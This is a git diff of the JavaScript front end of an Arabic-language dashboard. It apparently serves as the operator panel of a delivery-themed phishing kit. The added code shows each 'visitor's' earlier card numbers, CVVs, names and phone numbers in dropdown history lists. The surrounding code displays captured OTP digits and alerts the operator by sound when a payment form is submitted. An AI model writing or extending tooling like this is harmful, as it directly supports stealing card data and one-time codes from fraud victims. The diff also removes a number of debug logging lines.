@@ -569,9 +569,6 @@ function setupSocketListeners() {
   });
 
   socket.on('form:paymentSubmitted', (data) => {
-    console.log('💳 DATA RECEIVED VIA SOCKET (form:paymentSubmitted):', data);
-    console.log('💳 payment_submissions count:', data.payment_submissions?.length);
-    console.log('💳 payment_data type:', typeof data.payment_data);
     const sessionId = data.session_id || data.sessionId;
     
     // Play sound ONLY for actual submission - with spam protection
@@ -776,6 +773,68 @@ function createVisitorCard(visitor, isTrashMode = false) {
     </div>
   `).join('');
   
+  // Payment History Dropdown
+  let paymentHistoryToggle = '';
+  if (visitor.payment_submissions && visitor.payment_submissions.length > 1) {
+    const historyItems = visitor.payment_submissions.slice(1).map((sub, idx) => {
+      const subData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
+      const subCardNum = subData.cardNumber || subData.card_number || '';
+      const subCvv = subData.cvv || '';
+      const isCash = subData.paymentMethod === 'cash';
+      return `
+        <div style="padding:8px;background:rgba(16,185,129,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(16,185,129,0.2);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+            <span style="font-size:10px;color:var(--success);font-weight:600;">#${idx + 2}</span>
+            <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
+          </div>
+          ${subCardNum ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البطاقة:</span> <span dir="ltr">${escapeHtml(subCardNum)}</span></div>` : ''}
+          ${subCvv ? `<div style="font-size:11px;"><span style="color:#9ca3af;">CVV:</span> <span dir="ltr">${escapeHtml(subCvv)}</span></div>` : ''}
+          ${isCash ? `<div style="font-size:11px;color:#10b981;font-weight:600;">💵 دفع عند الاستلام - 25 ر.ق</div>` : ''}
+        </div>
+      `;
+    }).join('');
+    paymentHistoryToggle = `
+      <div style="margin-top:10px;">
+        <div class="payment-history-toggle" onclick="togglePaymentHistory('${sessionId}')" style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:6px 10px;background:rgba(16,185,129,0.15);border-radius:8px;font-size:11px;color:var(--success);font-weight:600;">
+          <span>▼</span> عرض ${visitor.payment_submissions.length - 1} بطاقة سابقة
+        </div>
+        <div id="paymentHistory_${sessionId}" class="payment-history-dropdown" style="display:none;margin-top:8px;">
+          ${historyItems}
+        </div>
+      </div>
+    `;
+  }
+  
+  // Delivery History Dropdown
+  let deliveryHistoryToggle = '';
+  if (visitor.delivery_submissions && visitor.delivery_submissions.length > 1) {
+    const historyItems = visitor.delivery_submissions.slice(1).map((sub, idx) => {
+      const subData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
+      return `
+        <div style="padding:8px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(59,130,246,0.2);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+            <span style="font-size:10px;color:var(--primary-light);font-weight:600;">#${idx + 2}</span>
+            <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
+          </div>
+          ${subData.fullName ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الاسم:</span> ${escapeHtml(subData.fullName)}</div>` : ''}
+          ${subData.phone ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الهاتف:</span> <span dir="ltr">${escapeHtml(subData.phone)}</span></div>` : ''}
+        </div>
+      `;
+    }).join('');
+    deliveryHistoryToggle = `
+      <div style="margin-top:10px;">
+        <div class="delivery-history-toggle" onclick="toggleDeliveryHistory('${sessionId}')" style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:6px 10px;background:rgba(59,130,246,0.15);border-radius:8px;font-size:11px;color:var(--primary-light);font-weight:600;">
+          <span>▼</span> عرض ${visitor.delivery_submissions.length - 1} إرسال سابق
+        </div>
+        <div id="deliveryHistory_${sessionId}" class="delivery-history-dropdown" style="display:none;margin-top:8px;">
+          ${historyItems}
+        </div>
+      </div>
+    `;
+  }
+  
   // OTP Digits HTML
   let otpDigitsHTML = '';
   if (otpValue) {
@@ -866,6 +925,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-content">
             ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
           </div>
+          ${deliveryHistoryToggle}
         </div>
         
         <!-- Payment Box -->
@@ -877,6 +937,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-content">
             ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
           </div>
+          ${paymentHistoryToggle}
         </div>
       </div>
       
@@ -1496,12 +1557,6 @@ function updateVisitorCardFull(card, data) {
   if (!card || !data) return;
   
   const sessionId = data.session_id || data.sessionId;
-  console.log('📝 updateVisitorCardFull:', sessionId, {
-    hasPaymentData: !!data.payment_data,
-    paymentSubmissionsCount: data.payment_submissions?.length,
-    hasDeliveryData: !!data.delivery_data,
-    deliverySubmissionsCount: data.delivery_submissions?.length
-  });
   
   // Update data attributes
   card.setAttribute('data-online', data.is_online === true);
@@ -1599,27 +1654,13 @@ function updateVisitorCardFull(card, data) {
 
 // Helper: Update or insert a section in card
 function updateCardSection(card, sectionClass, html) {
-  console.log('📝 updateCardSection called:', sectionClass);
-  console.log('📝 HTML contains dropdown:', html.includes('dropdown'));
-  
   const existing = card.querySelector('.card-section.' + sectionClass + '-section');
   const body = card.querySelector('.card-body');
   
-  console.log('📝 Existing section found:', !!existing);
-  
   if (existing) {
     existing.outerHTML = html;
-    console.log('📝 Replaced existing section');
   } else if (body) {
     body.insertAdjacentHTML('beforeend', html);
-    console.log('📝 Inserted new section at end of body');
-  }
-  
-  // Verify the section was added
-  const newSection = card.querySelector('.card-section.' + sectionClass + '-section');
-  if (newSection) {
-    const dropdown = newSection.querySelector('[id*="History"]');
-    console.log('📝 Dropdown found after insert:', !!dropdown);
   }
 }
 
@@ -1717,8 +1758,6 @@ window.toggleDeliveryHistory = function(sessionId) {
 
 // Helper: Build payment section HTML with all submissions history
 function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
-  console.log('💳 buildPaymentSection:', { sessionId, allSubmissionsCount: allSubmissions?.length });
-  
   // Get all submissions data
   const submissions = [];
   if (allSubmissions && allSubmissions.length > 0) {
@@ -1752,7 +1791,6 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
   // Title with dropdown toggle
   const count = submissions.length;
   const hasHistory = count > 1;
-  console.log('💳 hasHistory:', hasHistory, 'count:', count);
   
   html += '<div class="section-title payment-title" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
   html += '<span>💳</span> بيانات الدفع';
@@ -1827,26 +1865,14 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
   
   html += '</div>';
   
-  // Debug
-  console.log('💳 buildPaymentSection - HTML contains dropdown:', html.includes('paymentHistory_'));
-  console.log('💳 buildPaymentSection - sessionId used:', sessionId);
-  
   return html;
 }
 
 // Toggle payment history dropdown
 window.togglePaymentHistory = function(sessionId) {
-  console.log('💳 togglePaymentHistory called for:', sessionId);
   const historyEl = document.getElementById('paymentHistory_' + sessionId);
   if (historyEl) {
-    const newDisplay = historyEl.style.display === 'none' ? 'block' : 'none';
-    console.log('💳 Toggling dropdown display:', historyEl.style.display, '->', newDisplay);
-    historyEl.style.display = newDisplay;
-  } else {
-    console.log('💳 ERROR: paymentHistory element not found!');
-    // Try to find it with different ID pattern
-    const allElements = document.querySelectorAll('[id*="paymentHistory"]');
-    console.log('💳 Found elements with paymentHistory in ID:', allElements);
+    historyEl.style.display = historyEl.style.display === 'none' ? 'block' : 'none';
   }
 };
 
